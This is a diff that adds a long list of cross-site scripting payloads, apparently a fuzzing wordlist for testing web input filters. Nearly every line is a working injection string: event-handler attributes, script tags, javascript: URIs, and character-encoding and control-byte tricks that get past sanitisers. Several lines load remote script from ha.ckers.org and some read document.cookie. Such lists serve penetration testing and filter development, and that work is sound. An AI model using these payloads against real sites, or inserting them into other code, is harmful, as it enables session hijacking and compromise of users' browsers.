@@ -1,0 +1,1000 @@
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<script\x20type="text/javascript">javascript:prompt(1);</script>
+<script\x3Etype="text/javascript">javascript:prompt(1);</script>
+<script\x0Dtype="text/javascript">javascript:prompt(1);</script>
+<script\x09type="text/javascript">javascript:prompt(1);</script>
+<script\x0Ctype="text/javascript">javascript:prompt(1);</script>
+<script\x2Ftype="text/javascript">javascript:prompt(1);</script>
+<script\x0Atype="text/javascript">javascript:prompt(1);</script>
+'`"><\x3Cscript>javascript:prompt(1)</script>        
+'`"><\x00script>javascript:prompt(1)</script>
+<img src=1 href=1 onerror="javascript:prompt(1)"></img>
+<audio src=1 href=1 onerror="javascript:prompt(1)"></audio>
+<video src=1 href=1 onerror="javascript:prompt(1)"></video>
+<body src=1 href=1 onerror="javascript:prompt(1)"></body>
+<image src=1 href=1 onerror="javascript:prompt(1)"></image>
+<object src=1 href=1 onerror="javascript:prompt(1)"></object>
+<script src=1 href=1 onerror="javascript:prompt(1)"></script>
+<svg onResize svg onResize="javascript:javascript:prompt(1)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:prompt(1)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:prompt(1)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:prompt(1)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:prompt(1)"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:prompt(1)"></frameset onScroll>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:prompt(1)"></script onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:javascript:prompt(1)"></html onMouseUp>
+<body onPropertyChange body onPropertyChange="javascript:javascript:prompt(1)"></body onPropertyChange>
+<svg onLoad svg onLoad="javascript:javascript:prompt(1)"></svg onLoad>
+<body onPageHide body onPageHide="javascript:javascript:prompt(1)"></body onPageHide>
+<body onMouseOver body onMouseOver="javascript:javascript:prompt(1)"></body onMouseOver>
+<body onUnload body onUnload="javascript:javascript:prompt(1)"></body onUnload>
+<body onLoad body onLoad="javascript:javascript:prompt(1)"></body onLoad>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:prompt(1)"></bgsound onPropertyChange>
+<html onMouseLeave html onMouseLeave="javascript:javascript:prompt(1)"></html onMouseLeave>
+<html onMouseWheel html onMouseWheel="javascript:javascript:prompt(1)"></html onMouseWheel>
+<style onLoad style onLoad="javascript:javascript:prompt(1)"></style onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:prompt(1)"></iframe onReadyStateChange>
+<body onPageShow body onPageShow="javascript:javascript:prompt(1)"></body onPageShow>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:prompt(1)"></style onReadyStateChange>
+<frameset onFocus frameset onFocus="javascript:javascript:prompt(1)"></frameset onFocus>
+<applet onError applet onError="javascript:javascript:prompt(1)"></applet onError>
+<marquee onStart marquee onStart="javascript:javascript:prompt(1)"></marquee onStart>
+<script onLoad script onLoad="javascript:javascript:prompt(1)"></script onLoad>
+<html onMouseOver html onMouseOver="javascript:javascript:prompt(1)"></html onMouseOver>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:prompt(1)"></html onMouseEnter>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:prompt(1)"></body onBeforeUnload>
+<html onMouseDown html onMouseDown="javascript:javascript:prompt(1)"></html onMouseDown>
+<frameset onBlur frameset onBlur="javascript:javascript:prompt(1)"></frameset onBlur>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:prompt(1)"></applet onReadyStateChange>
+<svg onUnload svg onUnload="javascript:javascript:prompt(1)"></svg onUnload>
+<html onMouseOut html onMouseOut="javascript:javascript:prompt(1)"></html onMouseOut>
+<body onMouseMove body onMouseMove="javascript:javascript:prompt(1)"></body onMouseMove>
+<body onResize body onResize="javascript:javascript:prompt(1)"></body onResize>
+<object onError object onError="javascript:javascript:prompt(1)"></object onError>
+<body onPopState body onPopState="javascript:javascript:prompt(1)"></body onPopState>
+<html onMouseMove html onMouseMove="javascript:javascript:prompt(1)"></html onMouseMove>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:prompt(1)"></applet onreadystatechange>
+<body onpagehide body onpagehide="javascript:javascript:prompt(1)"></body onpagehide>
+<svg onunload svg onunload="javascript:javascript:prompt(1)"></svg onunload>
+<applet onerror applet onerror="javascript:javascript:prompt(1)"></applet onerror>
+<body onkeyup body onkeyup="javascript:javascript:prompt(1)"></body onkeyup>
+<body onunload body onunload="javascript:javascript:prompt(1)"></body onunload>
+<iframe onload iframe onload="javascript:javascript:prompt(1)"></iframe onload>
+<body onload body onload="javascript:javascript:prompt(1)"></body onload>
+<html onmouseover html onmouseover="javascript:javascript:prompt(1)"></html onmouseover>
+<object onbeforeload object onbeforeload="javascript:javascript:prompt(1)"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:prompt(1)"></body onbeforeunload>
+<body onfocus body onfocus="javascript:javascript:prompt(1)"></body onfocus>
+<body onkeydown body onkeydown="javascript:javascript:prompt(1)"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:prompt(1)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:prompt(1)"></iframe src>
+<svg onload svg onload="javascript:javascript:prompt(1)"></svg onload>
+<html onmousemove html onmousemove="javascript:javascript:prompt(1)"></html onmousemove>
+<body onblur body onblur="javascript:javascript:prompt(1)"></body onblur>
+\x3Cscript>javascript:prompt(1)</script>
+'"`><script>/* *\x2Fjavascript:prompt(1)// */</script>
+<script>javascript:prompt(1)</script\x0D
+<script>javascript:prompt(1)</script\x0A
+<script>javascript:prompt(1)</script\x0B
+<script charset="\x22>javascript:prompt(1)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:prompt(1)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:prompt(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:prompt(1)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:prompt(1)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:prompt(1)> -->
+`"'><img src='#\x27 onerror=javascript:prompt(1)>
+<a href="javascript\x3Ajavascript:prompt(1)" id="fuzzelement1">test</a>
+"'`><p><svg><script>a='hello\x27;javascript:prompt(1)//';</script></p>
+<a href="javas\x00cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x08cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x03cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<script>/* *\x2A/javascript:prompt(1)// */</script>
+<script>/* *\x00/javascript:prompt(1)// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x09<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:prompt(1)//></style>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:prompt(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:prompt(1);/*';">DEF 
+%253Cscript%253Eprompt('XSS')%253C%252Fscript%253E
+<script>if("x\\xE1\x96\x89".length==2) { javascript:prompt(1);}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:prompt(1);}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:prompt(1);}</script>
+'`"><\x3Cscript>javascript:prompt(1)</script>
+'`"><\x00script>javascript:prompt(1)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:prompt(1)>
+"'`><\x00img src=xxx:x onerror=javascript:prompt(1)>
+<script src="data:text/plain\x2Cjavascript:prompt(1)"></script>
+<script src="data:\xD4\x8F,javascript:prompt(1)"></script>
+<script src="data:\xE0\xA4\x98,javascript:prompt(1)"></script>
+<script src="data:\xCB\x8F,javascript:prompt(1)"></script>
+<script\x20type="text/javascript">javascript:prompt(1);</script>
+<script\x3Etype="text/javascript">javascript:prompt(1);</script>
+<script\x0Dtype="text/javascript">javascript:prompt(1);</script>
+<script\x09type="text/javascript">javascript:prompt(1);</script>
+<script\x0Ctype="text/javascript">javascript:prompt(1);</script>
+<script\x2Ftype="text/javascript">javascript:prompt(1);</script>
+<script\x0Atype="text/javascript">javascript:prompt(1);</script>
+<a href="\x0Bjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:prompt(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x22onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Donerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x09onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x00onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x27onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x20onerror=javascript:prompt(1)>
+"`'><script>\x3Bjavascript:prompt(1)</script>
+"`'><script>\x0Djavascript:prompt(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x81javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x84javascript:prompt(1)</script>
+"`'><script>\xE3\x80\x80javascript:prompt(1)</script>
+"`'><script>\x09javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x89javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x85javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x88javascript:prompt(1)</script>
+"`'><script>\x00javascript:prompt(1)</script>
+"`'><script>\xE2\x80\xA8javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:prompt(1)</script>
+"`'><script>\xE1\x9A\x80javascript:prompt(1)</script>
+"`'><script>\x0Cjavascript:prompt(1)</script>
+"`'><script>\x2Bjavascript:prompt(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:prompt(1)</script>
+"`'><script>-javascript:prompt(1)</script>
+"`'><script>\x0Ajavascript:prompt(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:prompt(1)</script>
+"`'><script>\x7Ejavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x87javascript:prompt(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\xA9javascript:prompt(1)</script>
+"`'><script>\xC2\x85javascript:prompt(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x83javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:prompt(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x80javascript:prompt(1)</script>
+"`'><script>\x21javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x82javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x86javascript:prompt(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:prompt(1)</script>
+"`'><script>\x0Bjavascript:prompt(1)</script>
+"`'><script>\x20javascript:prompt(1)</script>
+"`'><script>\xC2\xA0javascript:prompt(1)</script>
+<script\x20>javascript:prompt(1)</script>
+<script\x0D>javascript:prompt(1)</script>
+<script\x0A>javascript:prompt(1)</script>
+<script\x0C>javascript:prompt(1)</script>
+<script\x00>javascript:prompt(1)</script>
+<script\x09>javascript:prompt(1)</script>
+`"'><img src=xxx:x onerror\x0B=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x00=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x0C=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x0D=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x20=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x0A=javascript:prompt(1)>
+`"'><img src=xxx:x onerror\x09=javascript:prompt(1)>
+<script>javascript:prompt(1)<\x00/script>
+<img src=# onerror\x3D"javascript:prompt(1)" >
+<embed src="javascript:prompt(1)">
+<img src="javascript:prompt(1)">
+<image src="javascript:prompt(1)">
+<script src="javascript:prompt(1)">
+<img \x00src=x onerror="prompt(1)">
+<img \x47src=x onerror="javascript:prompt(1)">
+<img \x11src=x onerror="javascript:prompt(1)">
+<img \x12src=x onerror="javascript:prompt(1)">
+<img\x47src=x onerror="javascript:prompt(1)">
+<img\x10src=x onerror="javascript:prompt(1)">
+<img\x13src=x onerror="javascript:prompt(1)">
+<img\x32src=x onerror="javascript:prompt(1)">
+<img\x47src=x onerror="javascript:prompt(1)">
+<img\x11src=x onerror="javascript:prompt(1)">
+<img \x47src=x onerror="javascript:prompt(1)">
+<img \x34src=x onerror="javascript:prompt(1)">
+<img \x39src=x onerror="javascript:prompt(1)">
+<img \x00src=x onerror="javascript:prompt(1)">
+<img src\x09=x onerror="javascript:prompt(1)">
+<img src\x10=x onerror="javascript:prompt(1)">
+<img src\x13=x onerror="javascript:prompt(1)">
+<img src\x32=x onerror="javascript:prompt(1)">
+<img src\x12=x onerror="javascript:prompt(1)">
+<img src\x11=x onerror="javascript:prompt(1)">
+<img src\x00=x onerror="javascript:prompt(1)">
+<img src\x47=x onerror="javascript:prompt(1)">
+<img src=x\x09onerror="javascript:prompt(1)">
+<img src=x\x10onerror="javascript:prompt(1)">
+<img src=x\x11onerror="javascript:prompt(1)">
+<img src=x\x12onerror="javascript:prompt(1)">
+<img src=x\x13onerror="javascript:prompt(1)">
+<img src=x onerror=\x09"javascript:prompt(1)">
+<img src=x onerror=\x10"javascript:prompt(1)">
+<img src=x onerror=\x11"javascript:prompt(1)">
+<img src=x onerror=\x12"javascript:prompt(1)">
+<img src=x onerror=\x32"javascript:prompt(1)">
+<img src=x onerror=\x00"javascript:prompt(1)">
+<img src="x` `<script>javascript:prompt(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:prompt(1)//">
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:prompt(1)">XXX</a>
+<x style="behavior:url(%(sct)s)">
+<IMG SRC="javascript:javascript:prompt(1)"
+<a href="jav&#65ascript:javascript:prompt(1)">test1</a>
+<a href="jav&#97ascript:javascript:prompt(1)">test1</a>
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:prompt('XSS');">
+<IMG SRC=javascript:prompt('XSS')>
+<IMG SRC=JaVaScRiPt:prompt('XSS')>
+<IMG SRC=javascript:prompt("XSS")>
+<IMG SRC=`javascript:prompt("RSnake says, 'XSS'")`>
+<a onmouseover="prompt(document.cookie)">xxs link</a>
+<a onmouseover=prompt(document.cookie)>xxs link</a>
+<IMG """><SCRIPT>prompt("XSS")</SCRIPT>">
+<IMG SRC=javascript:prompt(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="prompt('xxs')">
+<IMG SRC= onmouseover="prompt('xxs')">
+<IMG onmouseover="prompt('xxs')">
+<IMG SRC="jav	ascript:prompt('XSS');">
+<IMG SRC="jav&#x09;ascript:prompt('XSS');">
+<IMG SRC="jav&#x0A;ascript:prompt('XSS');">
+<img src=`xx:xx`onerror=prompt(1)>
+‘; prompt(1);
+‘)prompt(1);//
+<ScRiPt>prompt(1)</sCriPt>
+<IMG SRC=jAVasCrIPt:prompt(‘XSS’)>
+<IMG SRC=”javascript:prompt(‘XSS’);”>
+<IMG SRC=javascript:prompt(&quot;XSS&quot;)>
+<IMG SRC=javascript:prompt(‘XSS’)>      
+<img src=xss onerror=prompt(1)>
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<script>+-+-1-+-+prompt(1)</script>
+<body/onload=&lt;!--&gt;&#10prompt(1)>
+<script itworksinallbrowsers>/*<script* */prompt(1)</script
+<img src ?itworksonchrome?\/onerror = prompt(1)
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> prompt(1)
+javascript:prompt("hellox worldss")
+<img src="javascript:prompt('XSS');">
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>prompt("XSS");//<</SCRIPT>
+<!--<img src="--><img src=x onerror=prompt(123)//">
+<style><img src="</style><img src=x onerror=prompt(123)//">
+<IMG SRC="javascript:prompt('XSS');">
+<IMG SRC=javascript:prompt('XSS')>
+<IMG SRC=JaVaScRiPt:prompt('XSS')>
+<IMG SRC=javascript:prompt("XSS")>
+<IMG SRC=`javascript:prompt("RSnake says, 'XSS'")`>
+<a onmouseover="prompt(document.cookie)">xxs link</a>
+<a onmouseover=prompt(document.cookie)>xxs link</a>
+<IMG """><SCRIPT>prompt("XSS")</SCRIPT>">
+<IMG SRC=javascript:prompt(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="prompt('xxs')">
+<IMG SRC= onmouseover="prompt('xxs')">
+<IMG onmouseover="prompt('xxs')">
+<IMG SRC="jav&#x09;ascript:prompt('XSS');">
+<IMG SRC="jav&#x0A;ascript:prompt('XSS');">
+<IMG SRC="jav&#x0D;ascript:prompt('XSS');">
+<IMG SRC=" &#14;  javascript:prompt('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=prompt("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>prompt("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:prompt('XSS')"
+<iframe src=http://ha.ckers.org/scriptlet.html <
+\";prompt('XSS');//
+</script><script>prompt('XSS');</script>
+</TITLE><SCRIPT>prompt("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:prompt('XSS');">
+<BODY BACKGROUND="javascript:prompt('XSS')">
+<IMG DYNSRC="javascript:prompt('XSS')">
+<IMG LOWSRC="javascript:prompt('XSS')">
+<A HREF="http://66.102.7.147/">XSS</A>
+0\"autofocus/onfocus=prompt(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+veris-->group<svg/onload=prompt(/XSS/)//
+#"><img src=M onerror=prompt('XSS');>
+element[attribute='<img src=x onerror=prompt('XSS');>
+[<blockquote cite="]">[" onmouseover="prompt('RVRSH3LL_XSS');" ]
+%22;prompt%28%27RVRSH3LL_XSS%29//
+javascript:prompt%281%29;
+<w contenteditable id=x onfocus=prompt()>
+prompt;pg("XSS")
+<svg/onload=%26%23097lert%26lpar;1337)>
+<script>for((i)in(self))eval(i)(1)</script>
+<scr<script>ipt>prompt(1)</scr</script>ipt><scr<script>ipt>prompt(1)</scr</script>ipt>
+<sCR<script>iPt>prompt(1)</SCr</script>IPt>
+<IMG SRC=x onunload="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onblur="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onchange="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncontextmenu="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninput="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninvalid="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onreset="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsearch="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onselect="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsubmit="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeydown="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeypress="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeyup="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onclick="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondblclick="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousedown="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousemove="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseout="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseover="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseup="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousewheel="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwheel="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrag="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragend="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragenter="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragleave="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragover="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragstart="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrop="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onscroll="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncopy="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncut="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpaste="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onabort="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplay="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplaythrough="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncuechange="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondurationchange="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onemptied="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onended="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadeddata="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadedmetadata="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadstart="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpause="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplay="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplaying="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onprogress="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onratechange="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeked="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeking="prompt(String.fromCharCode(88,83,83))">
